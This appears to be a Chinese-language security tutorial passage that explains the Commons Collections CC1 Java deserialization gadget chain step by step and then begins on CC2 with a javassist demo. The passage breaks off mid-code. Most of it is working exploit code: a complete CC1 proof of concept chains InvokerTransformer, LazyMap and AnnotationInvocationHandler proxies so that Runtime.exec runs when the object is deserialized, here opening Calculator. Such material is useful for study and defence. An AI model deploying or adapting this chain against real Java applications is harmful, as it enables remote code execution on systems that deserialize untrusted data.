**利用链分析**
先对后半段链进行分析。在commons
collections中有一个Transformer接口，其中包含一个transform方法，通过实现此接口来达到类型转换的目的。
其中有众多类实现了此接口，cc中主要利用到了以下三个。
  * InvokerTransformer
其transform方法实现了通过反射来调用某方法：
  * ConstantTransformer
其transform方法将输入原封不动的返回：
  * ChainedTransformer
其transform方法实现了对每个传入的transformer都调用其transform方法，并将结果作为下一次的输入传递进去：
由这三个transformer组合起来，即可实现任意命令执行：
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.*;
    public class cc1 {
         public static void main(String[] args){
              ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                      new ConstantTransformer(Runtime.class),
                      new InvokerTransformer("getMethod", new Class[] {
                              String.class, Class[].class }, new Object[] {
                              "getRuntime", new Class[0] }),
                      new InvokerTransformer("invoke", new Class[] {
                              Object.class, Object[].class }, new Object[] {
                              null, new Object[0] }),
                      new InvokerTransformer("exec",
                              new Class[] { String.class }, new Object[]{"open  /System/Applications/Calculator.app"})});
              chain.transform(123);
         }
    }
先说下这个反射链是如何构成的，先看InvokerTransformer的transform方法：
        public Object transform(Object input) {
            if (input == null) {
                return null;
            } else {
                try {
                    Class cls = input.getClass();
                    Method method = cls.getMethod(this.iMethodName, this.iParamTypes);
                    return method.invoke(input, this.iArgs);
这里接收了一个Object，并调用这个Object方法，方法名、方法所需要的参数类型、方法所需要的参数这三个都是我们可以控制的。
所以我们可以直接通过这里来命令执行：
    Runtime runtime = Runtime.getRuntime();
    Transformer invoketransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open  /System/Applications/Calculator.app"});
    invoketransformer.transform(runtime);
这就需要一个条件，在调用transform方法的时候，需要传递一个Runtime.getRuntime()，这几乎是不可能的，没有人会在反序列化后调用transform方法还传递一个Runtime的实例进去。我们需要把攻击所需要的条件尽可能的缩小，实现在反序列化时就能够rce，所以需要想办法把传递Runtime.getRuntime()这一条件给去掉。接着就找到了ConstantTransformer这个类。
上面说了，其transform方法是将输入的Object原封不动的返回回去，那么我们是不是可以尝试这么搭配：
    Object constantTransformer = new ConstantTransformer(Runtime.getRuntime()).transform(123);
    Transformer invoketransformer = new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open  /System/Applications/Calculator.app"});
    invoketransformer.transform(constantTransformer);
上述代码搭配ChainedTransformer是这样的：
         public void test(){
              ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
                      new ConstantTransformer(Runtime.getRuntime()),
                      new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"open  /System/Applications/Calculator.app"})
              });
              chain.transform(123);
         }
此时只要ChainedTransformer反序列化后调用transform方法并传递任意内容即可实现rce，但是当尝试去序列化的时候，发生了一个问题：
因为这里的Runtime.getRuntime()返回的是一个Runtime的实例，而Runtime并没有继承Serializable，所以这里会序列化失败。
那么我们就需要找到一个方法来获取到Runtime.getRuntime()返回的结果，并将其传入invoketransformer的transform方法中。这就有了上边那条链。
这里通过InvokerTransformer来实现了一次反射，即通过反射来反射，先是调用getMethod方法获取了getRuntime这个Method对象，接着又通过Invoke获取getRuntime的执行结果。
这里我一开始看Class[].class以及new
Class[0]十分懵逼，不明白到底是为什么，后边经过几位师傅的指导终于理解了。我们这里尝试通过反射去调用getMethod方法，而getMethod的定义如下：
这里需要传入一个name也就是要调用的方法名，接着需要传递一个可变参数，所以这里的Class[].class，其实就是对应着这里的可变参数，即使我们不需要传递参数，也需要在这里加一个Class[].class，后边再加一个new
Class[0]起到占位的作用。
梳理一下现在已经构造好的链：
              ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                      new ConstantTransformer(Runtime.class),
                      new InvokerTransformer("getMethod", new Class[] {
                              String.class, Class[].class }, new Object[] {
                              "getRuntime", new Class[0] }),
                      new InvokerTransformer("invoke", new Class[] {
                              Object.class, Object[].class }, new Object[] {
                              null, new Object[0] }),
                      new InvokerTransformer("exec",
                              new Class[] { String.class }, new Object[]{"open  /System/Applications/Calculator.app"})});
              chain.transform(123);
目前已经构造到只需要反序列化后调用transform方法，并传递任意内容即可rce。我们的目的是在调用readObject的时候就触发rce，也就是说我们现在需要找到一个点调用了transform方法（如果能找到在readObject后就调用那是最好的），如果找不到在readObject里调用transform方法，那么就需要找到一条链，在readObject触发起点，接着一步步调用到了transform方法。
cc1里用的是Lazymap#get这个方法：
如果这里的this.factory可控，那么我们就可以通过LazyMap来延长我们的链，下一步就是找哪里调用了get方法了。
    protected final Transformer factory;
这里的factory并没有被transient以及static关键字修饰，所以是我们可控的，并且由于factory是在类初始化时定义的，所以我们可以通过创建LazyMap实例的方式来设置他的值。
但是这里的构造方法并不是public的，所以需要通过反射的方式来获取到这个构造方法，再创建其实例。
         public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException {
              ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                      new ConstantTransformer(Runtime.class),
                      new InvokerTransformer("getMethod", new Class[] {
                              String.class, Class[].class }, new Object[] {
                              "getRuntime", new Class[0] }),
                      new InvokerTransformer("invoke", new Class[] {
                              Object.class, Object[].class }, new Object[] {
                              null, new Object[0] }),
                      new InvokerTransformer("exec",
                              new Class[] { String.class }, new Object[]{"open  /System/Applications/Calculator.app"})});
              HashMap innermap = new HashMap();
              Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap");
              Constructor[] constructors = clazz.getDeclaredConstructors();
              Constructor constructor = constructors[0];
              constructor.setAccessible(true);
              LazyMap map = (LazyMap)constructor.newInstance(innermap,chain);
              map.get(123);
         }
接着我们需要找到某个地方调用了get方法，并且传递了任意值。通过学习了上边动态代理的知识，我们可以开始分析cc1的前半段链了。
入口时AnnotationInvocationHandler的readObject：
这里的readObject又调用了this.memberValues的entrySet方法。如果这里的memberValues是个代理类，那么就会调用memberValues对应handler的invoke方法，cc1中将handler设置为AnnotationInvocationHandler（其实现了InvocationHandler，所以可以被设置为代理类的handler）。
    public Object invoke(Object var1, Method var2, Object[] var3) {
            String var4 = var2.getName();
            Class[] var5 = var2.getParameterTypes();
            if (var4.equals("equals") && var5.length == 1 && var5[0] == Object.class) {
                return this.equalsImpl(var3[0]);
            } else if (var5.length != 0) {
                throw new AssertionError("Too many parameters for an annotation method");
            } else {
                byte var7 = -1;
                switch(var4.hashCode()) {
                case -1776922004:
                    if (var4.equals("toString")) {
                        var7 = 0;
                    }
                    break;
                case 147696667:
                    if (var4.equals("hashCode")) {
                        var7 = 1;
                    }
                    break;
                case 1444986633:
                    if (var4.equals("annotationType")) {
                        var7 = 2;
                    }
                }
                switch(var7) {
                case 0:
                    return this.toStringImpl();
                case 1:
                    return this.hashCodeImpl();
                case 2:
                    return this.type;
                default:
                    Object var6 = this.memberValues.get(var4);
这里对this.memberValues调用了get方法，如果此时this.memberValues为我们的map，那么就会触发LazyMap#get，从而完成触发rce。
完整POC：
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.*;
    import org.apache.commons.collections.map.LazyMap;
    import org.apache.commons.collections.map.PredicatedMap;
    import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.reflect.*;
    import java.util.HashMap;
    import java.util.Map;
    public class cc1 {
         public static void main(String[] args) throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchFieldException {
              ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                      new ConstantTransformer(Runtime.class),
                      new InvokerTransformer("getMethod", new Class[] {
                              String.class, Class[].class }, new Object[] {
                              "getRuntime", new Class[0] }),
                      new InvokerTransformer("invoke", new Class[] {
                              Object.class, Object[].class }, new Object[] {
                              null, new Object[0] }),
                      new InvokerTransformer("exec",
                              new Class[] { String.class }, new Object[]{"open  /System/Applications/Calculator.app"})});
              HashMap innermap = new HashMap();
              Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap");
              Constructor[] constructors = clazz.getDeclaredConstructors();
              Constructor constructor = constructors[0];
              constructor.setAccessible(true);
              Map map = (Map)constructor.newInstance(innermap,chain);
              Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
              handler_constructor.setAccessible(true);
              InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //创建第一个代理的handler
              Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler); //创建proxy对象
              Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
              AnnotationInvocationHandler_Constructor.setAccessible(true);
              InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);
              try{
                   ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./cc1"));
                   outputStream.writeObject(handler);
                   outputStream.close();
                   ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./cc1"));
                   inputStream.readObject();
              }catch(Exception e){
                   e.printStackTrace();
              }
         }
    }
分析一下利用过程：
在readObject时，会触发AnnotationInvocationHandler#readObject方法：
此时调用了this.memberValues.entrySet，而this.memberValues是之前构造好的proxy_map，由于这是一个代理对象，所以调用其方法时，会去调用其创建代理时设置的handler的invoke方法。
这个proxy_map设置的handler为这个map_handler,同样是InvocationHandler这个类，接着会调用他的invoke方法：
InvocationHandler#invoke的78行代码中调用了this.memberValues#get，此时的this.memberValues为之前设置好的lazymap，所以这里调用的是lazymap#get，从而触发后边的rce链。
这里还是比较绕的，因为设置了两个handler，但是第一个handler是为了触发lazymap#get，而第二个handler实际上只是为了触发代理类所设置handler的invoke方法。
接着解释一些细节的问题：
1.为什么这里要用反射的方式来创建AnnotationInvocationHandler的实例?
因为AnnotationInvocationHandler并不是public类，所以无法直接通过new的方式来创建其实例。
2.为什么创建其实例时传入的第一个参数是Override.class?
因为在创建实例的时候对传入的第一个参数调用了isAnnotation方法来判断其是否为注解类：
        public boolean isAnnotation() {
            return (getModifiers() & ANNOTATION) != 0;
        }
而Override.class正是java自带的一个注解类：
所以这里可以直接用上，当然要是换成其他注解类也是ok的。
**后话**
创建lazymap那里其实并不需要用到反射，因为lazymap自带了一个方法来帮助我们创建其实例：
所以把上述通过反射来创建LazyMap的实例代码改为如下，也是可以成功的：
      HashMap innermap = new HashMap();
      LazyMap map = (LazyMap)LazyMap.decorate(innermap,chain);
###  CommonsCollections 2
测试环境：
  * JDK 1.7
  * Commons Collections 4.0
  * javassit
maven：
        org.apache.commons
        commons-collections4
        4.0
        org.javassist
        javassist
        3.25.0-GA
**利用链**
            ObjectInputStream.readObject()
                PriorityQueue.readObject()
                    ...
                        TransformingComparator.compare()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()
**javassit**
cc2中用到了这块知识，在这里记录一下。
导包：
      org.javassist
      javassist
      3.25.0-GA
.java文件需要编译成.class文件后才能正常运行，而javassit是用于对生成的class文件进行修改，或以完全手动的方式，生成一个class文件。
Demo:
    import javassist.*;
    public class javassit_test {
        public static void createPseson() throws Exception {
            ClassPool pool = ClassPool.getDefault();
            // 1. 创建一个空类
            CtClass cc = pool.makeClass("Person");
            // 2. 新增一个字段 private String name;
            // 字段名为name
            CtField param = new CtField(pool.get("java.lang.String"), "name", cc);
            // 访问级别是 private
            param.setModifiers(Modifier.PRIVATE);
            // 初始值是 "xiaoming"
            cc.addField(param, CtField.Initializer.constant("xiaoming"));
            // 3. 生成 getter、setter 方法
            cc.addMethod(CtNewMethod.setter("setName", param));
            cc.addMethod(CtNewMethod.getter("getName", param));
            // 4. 添加无参的构造函数
            CtConstructor cons = new CtConstructor(new CtClass[]{}, cc);
            cons.setBody("{name = "xiaohong";}");
            cc.addConstructor(cons);
            // 5. 添加有参的构造函数
            cons = new CtConstructor(new CtClass[]{pool.get("java.lang.String")}, cc);
            // $0=this / $1,$2,$3... 代表方法参数
            cons.setBody("{$0.name = $1;}");
            cc.addConstructor(cons);
            // 6. 创建一个名为printName方法，无参数，无返回值，输出name值
            CtMethod ctMethod = new CtMethod(CtClass.voidType, "printName", new CtClass[]{}, cc);
            ctMethod.setModifiers(Modifier.PUBLIC);
            ctMethod.setBody("{System.out.println(name);}");
            cc.addMethod(ctMethod);
            //这里会将这个创建的类对象编译为.class文件
            cc.writeFile("./");
        }
        public static void main(String[] args) {
            try {
                createPseson();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
上面的代码生成的class文件是这样的：
通过代码结合生成的class来理解就好了，十分简单。
**利用链分析**
后半段链和cc1差不多，所以这里可以正向分析，从readObject来学习整条链。
PriorityQueue#readObject：
        private void readObject(java.io.ObjectInputStream s)
            throws java.io.IOException, ClassNotFoundException {
            // Read in size, and any hidden stuff
            s.defaultReadObject();
            // Read in (and discard) array length
            s.readInt();